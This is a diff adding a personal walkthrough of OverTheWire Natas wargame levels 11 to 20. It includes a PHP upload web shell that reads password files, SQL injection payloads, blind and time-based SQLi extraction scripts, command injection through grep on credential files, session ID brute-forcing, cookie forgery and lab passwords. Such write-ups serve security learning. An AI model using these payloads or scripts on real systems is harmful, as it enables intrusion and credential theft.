@@ -1,0 +1,386 @@
+natas 11
+
+the php source code is long this time. however, if we see the request being sent to the server, we see that there is a cookie 'data' being sent, which contains a base64 encoded value. in the php source code, we can see the fucntion 
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+and we can see this function being called - 
+saveData($data);
+where the data variable contains 
+
+$data = loadData($defaultdata);
+
+and
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+if we look into the function loadData, we see that it is actually replacing the showpassword and bgcolor fields within the $defaultdata variable with what exists in the cookie
+and the cookie is processed by first base64 decoding it, then xor decrypting it with some unknown key, and finally json decoding it. now in the main page, we can see that if the showpassword field is set to "yes" then we can get the password.
+
+hence we need to modify the value in the cookie. to do this, we can json encode the default value and base64 decode the cookie and xor them to get the xor key.
+
+which looks like - 
+
+<?php  
+$d = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+$v1 = json_encode($d);
+$v = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");
+for($i = 0; $i < 10; $i++)
+{
+	echo $v1[$i]^$v[$i];
+}
+?>  
+
+
+hence we get the xor key which looks like 'KNHL'
+
+now, we just need to use the functions from the php page source and make the cookie like we want.
+
+<?php  
+$d = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = 'KNHL';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+echo base64_encode(xor_encrypt(json_encode($d)))
+?>  
+
+hence we get the cookie to be put in place of 'data' in the set of cookies and by doing so we get the password for natas12
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 12
+
+in this we are given an option to upload a jpg file
+
+all we need to do is click upload file and edit the file contents by modifying the request being sent. or we can set a file from our computer.
+
+we just need to make a php file containing content
+
+<?php
+	$d = shell_exec("cat /etc/natas_webpass/natas13");
+	echo $d;
+?>
+
+also, we see a file name which looks randomly generated with a .jpg file extension. we need to change that to php
+
+hence we can run the php script in the server by opening it in the server and we get password to natas13
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 13
+
+when we view the php source code, we see
+
+ if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+
+hence we need the file we upload to have a .jpg or image file extension and also the first few lines of the file should resemble that of an image file.
+
+so we can directly upload an image file and then click upload file to send the request. from there we can edit the request and remove unecessary extra info in the image file and just leave the first 3 to 4 lines of the image file content intact.
+
+then we append our code to that content like
+
+<?php
+	$d = shell_exec("cat /etc/natas_webpass/natas14");
+	echo $d;
+?>
+
+and change the extension of the randomly generated filename to .php
+
+hence we get natas 14's password
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 14
+
+we are greeted with the option to enter username and password when we enter the site.
+
+when we check the php source code, we see
+
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+
+if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+
+we just need to get a valid username and password that would match.
+however this is very obviously vulnerable to sqli, our input is enclosed in double quotes.
+hence in username, we can just use 
+
+" or 1 -- '
+
+to make the query to return all the values in the table hence we get natas 15 password
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 15
+
+in this level, if we enter a username that exists, like 'natas16' it says it exists else it says This user doesn't exist.
+
+from the php page source, we can see that it's executing an sql query.
+
+this is an example of blind sqli.
+
+so I wrote the python script to solve this level
+
+==============================================================
+import requests
+from requests.auth import HTTPBasicAuth
+  
+queryEnd = "#"
+length = 0
+query = ""
+#data = {"username":"\" or "}
+for i in range(0,100):
+    data = {"username":"natas16\" and length(password) = " + str(i) + queryEnd}
+    response = requests.post('http://natas15.natas.labs.overthewire.org/', data, 
+    auth = HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'))
+    if "exists" in response.text:
+        length = i
+        print("length = " + str(length))
+        break
+
+returnval = ""
+for i in range(1, length + 1):
+    for j in range(48,123):
+        data = {"username":"natas16\" and binary substr(password, " + str(i) + " , 1) = '" + chr(j) + "'" + queryEnd}
+        response = requests.post('http://natas15.natas.labs.overthewire.org/', data, 
+        auth = HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'))
+        if "exists" in response.text:
+            print(chr(j))
+            returnval += chr(j)
+            break
+print(returnval)
+
+==============================================================
+
+hence it prints the natas 16 password
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 16
+
+this is similar to natas 10 however, more number of characters are filtered.
+
+if we do like 
+
+a$(echo ngels)
+
+it would translate to 'angels'
+
+hence using this principle, we can do like
+
+angels$(grep a /etc/natas_webpass/natas17)
+
+so if 'a' is there in the natas17 password then the string won't be found in the dictionary else it will be found.
+using a python script, we can find the whole password
+
+==============================================================
+import requests
+from requests.auth import HTTPBasicAuth
+  
+p1 = ""
+charset = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
+for j in range(0,32):
+    for k in range(0,len(charset)):
+        response = requests.get('http://natas16.natas.labs.overthewire.org/', params = {"needle":"doom$(grep " + charset[k] + p1 + " /etc/natas_webpass/natas17 )","submit":"Search"}, 
+        auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'))
+        if "doom" not in response.text:
+            p1 = charset[k] + p1
+            break
+        elif k == len(charset) - 1:
+            j = 32
+for j in range(len(p1),32):
+    for k in range(0,len(charset)):
+        response = requests.get('http://natas16.natas.labs.overthewire.org/', params = {"needle":"doom$(grep " + p1 + charset[k] + " /etc/natas_webpass/natas17 )","submit":"Search"}, 
+        auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'))
+        if "doom" not in response.text:
+            p1 = p1 + charset[k]
+            break
+    
+    print(p1)
+==============================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 17
+
+this is similar to natas 15, except, it doesn't print anything in any case
+therefore, we can use time-based blind sqli
+
+==============================================================
+import requests
+from requests.auth import HTTPBasicAuth
+
+charset = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
+
+qlen = 0
+
+returnval=""
+
+for i in range(1,33):
+    for j in range(len(charset)):
+        data = {"username":"natas18\" and binary substr(password,1," + str(i) + ")=\"" + returnval + charset[j] + "\" and sleep(4) -- "}
+        response = requests.post('http://natas17.natas.labs.overthewire.org/',data, auth = HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'))
+        if(response.elapsed.total_seconds() > 4):
+            returnval += charset[j]
+            print("\ncurrently found :" + returnval)
+            break
+        else:
+            print("\rtrying character : " + str(charset[j]),end="")
+        if(j == len(charset) - 1):
+            print("\r!!!end of charset reached yet no ouptut!!!")
+            exit(0)
+
+print(response.text)
+print("time taken = " + str(response.elapsed.total_seconds()))
+
+==============================================================
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 18
+
+in the php source code, we can see that the session id is set in range between 0 to 640
+and one of these session id is for the admin
+hence we just need to iterate session id from 0 to 640 this can be done using intruder in burpsuit or python script - 
+==============================================================
+
+import requests
+
+session = requests.session()
+
+url = "http://natas18.natas.labs.overthewire.org/index.php"
+
+natas18_cookies = {"__utma": "176859643.1428234355.1692182167.1692638825.1692717040.8", "__utmz": "176859643.1692717040.8.8.utmcsr=natas.labs.overthewire.org|utmccn=(referral)|utmcmd=referral|utmcct=/", "PHPSESSID": "123"}
+
+natas18_hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://natas18.natas.labs.overthewire.org/index.php", "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+
+natas18_data = {"username": "user", "password": "pass"} 
+for x in range(640):
+    natas18_cookies['PHPSESSID'] = str(x)
+    res = session.post(url, headers=natas18_hdrs, cookies=natas18_cookies, data=natas18_data)
+    if ('You are an admin. The credentials for the next level are:<br>' in res.text):
+        print(res.text)
+        break
+
+
+==============================================================
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 19
+
+we can see that it's mostly the same as the previous however, the session ids are no longer sequential.
+
+when we see the session id, it looks like hex encoded, hence you can try ascii hex decoding it. it comes like <number>-<username>
+now, we just need to write a script to iterate through the numbers from 0 to 640
+
+instead of writing a python script, using intruder of burpsuite would be much easier since we need to encode and all that.
+
+however if you were to stick to writing a python script, it would look like - 
+==============================================================
+import requests
+import binascii
+session = requests.session()
+
+url = "http://natas19.natas.labs.overthewire.org/index.php"
+
+natas19_cookies = {"__utma": "176859643.1428234355.1692182167.1692638825.1692717040.8", "__utmz": "176859643.1692717040.8.8.utmcsr=natas.labs.overthewire.org|utmccn=(referral)|utmcmd=referral|utmcct=/", "PHPSESSID": "123"}
+
+natas19_hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://natas19.natas.labs.overthewire.org/index.php", "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+
+natas19_data = {"username": "user", "password": "pass"} 
+tmp = ""
+for x in range(239,640):
+    tmp = (binascii.b2a_hex((str(x) + '-' + 'admin').encode())).decode()
+    #print(tmp)
+    natas19_cookies['PHPSESSID'] = tmp
+    print("\r trying x = " + str(x), end="")
+    res = session.post(url, headers=natas19_hdrs, cookies=natas19_cookies, data=natas19_data)
+    #print(res.text)
+    if ('You are an admin. The credentials for the next level are:<br>' in res.text):
+        print(res.text)
+        break
+
+
+==============================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+natas 20
+
+we can enter a name as input. and we also need to enable the debug mode by putting debug parameter in the url(i.e. http://natas20.natas.labs.overthewire.org/index.php?debug).
+when we enter a name once and press enter
+we see some things on screen like 
+
+DEBUG: MYREAD qs5h7g9t153tptnk5dqcllpf3i
+DEBUG: Session file doesn't exist
+DEBUG: Name set to admin
+
+on viewing php page source, we see that in the function
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+the line session file doesn't exist gets printed
+the function mywrite makes the file. hence when we reload the page we'll see a different set of values since the file exists.
+
+now our main focus is on the myread function and 
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+in the print_credentials function, it checks if the admin session variable has the variable 1 or not.
+and our input is written in the session variable 'name'. however in the myread function, when the contents are read from file and loaded into the session variables, there is a vulnerability that allows us to set value for the admin session variable.
+
+the writes values into the file like - key followed by value. and newline for the next key
+the first key in the sequence is name and its value can be set to anything. then we are supposed to insert a character in the request such that it would put the 'admin' key in a new line and ,followed by a space, would keep the value 1.
+
+hence we can url encode and send the values like - 
+
+name=admin%0Aadmin%201
+
+in the post request. in debug mode, after this we get the password to natas21
+
+
